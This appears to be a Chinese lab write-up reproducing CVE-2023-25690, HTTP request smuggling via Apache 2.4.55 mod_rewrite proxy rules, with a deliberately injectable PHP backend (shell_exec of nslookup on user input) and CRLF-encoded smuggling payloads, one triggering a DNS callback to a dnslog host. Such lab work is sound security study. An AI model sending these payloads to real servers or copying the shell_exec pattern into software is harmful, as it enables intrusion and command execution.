ailx10说：这篇是2025年2月之前写的，后来又改过。这次请求走私，不是我常见的长度头分歧，而是代理的重写规则把 URL 内容带进后端请求，换行之后多出了一段请求。我一边看前端配置，一边对后端日志，确认 SMUGGLED 真正落到了哪里，再观察内部功能产生的 DNS 线索。把这些现象对起来，才不只是发完包看个状态码。笔记留下的重点是前后两端怎样解释同一段输入；回调由哪个功能触发，也得说清，不能见到 DNS 记录就把整条利用链都当成已经证明。

---

本文记录反向代理将捕获的 URL 内容重新插入后端请求时，回车换行导致请求边界变化的历史实验。

需特定代理与重写配置；该案例并非以 CL/TE 长度差为主要机制。DNS 回调来自后端示例功能，历史脚本与日志未复验。

历史实验曾修改容器安全选项解决启动问题。应先检查环境、日志和最小权限配置，不应把关闭该保护作为通用步骤。

```
https://github.com/dhmosfunk/CVE-2023-25690-POC.git



docker-compose up --build
```

访问 docker 实验环境，可以看到 Apache 版本是 2.4.55

![](/notes-assets/1a7280c8d46b01fab3ea.webp)

网站的配置如下，其中一条：

```
RewriteRule "^/categories/(.*)" "http://backend-server:8080/categories.php?id=$1" [P] 
```

这是一个重写规则，`[P]`标志表示这条规则使用代理方式处理，它会捕获以`/categories/`开头的所有请求，并将其转发给后台服务器（`http://backend-server:8080`），同时传递捕获的参数（如`id`）

```
ErrorLog "/usr/local/apache2/logs/error.log"

CustomLog "/usr/local/apache2/logs/access.log" common





LoadModule rewrite_module modules/mod_rewrite.so

LoadModule proxy_module modules/mod_proxy.so

LoadModule proxy_http_module modules/mod_proxy_http.so



<VirtualHost *:80>



    ServerName localhost

    DocumentRoot /usr/local/apache2/htdocs



    RewriteEngine on

    RewriteRule "^/categories/(.*)" "http://backend-server:8080/categories.php?id=$1" [P]

    ProxyPassReverse "/categories/" "http://backend-server:8080/"



</VirtualHost>
```

后端处理逻辑：

```
<?php



if(isset($_GET['id'])){

    $id = $_GET['id'];

    echo 'You category ID is: ' . $id;

}else{

    echo "Please insert the ID parameter in the URL";

}



#Internal secret functionality

if(isset($_GET['secret'])){

    $secret = $_GET['secret'];



    shell_exec('nslookup ' . $secret);

}



?>

```

实验结束后，请仅清理属于本实验的资源，并先确认不会影响其他项目。

GET /categories/1%20HTTP/1.1%0d%0aFoo:%20baarr HTTP/1.1

（2）验证HTTP请求走私

```
GET /categories/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/SMUGGLED HTTP/1.1
```

![](/notes-assets/4e2932d7055fd2abe3f1.webp)

查看后台请求，果然走私请求了 `/SMUGGLED` （尽管响应404）

（3）DNS带外传输

```
GET /categories/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/categories.php%3fsecret=e4508756aa.ipv6.1433.eu.org. HTTP/1.1
```

后台确实访问了 dnslog 平台

DNS回调是后续内部动作的反馈，日志里的请求边界才解释了前面的走私机制。把这两层证据接起来，比只展示一段包含CRLF的请求更完整。
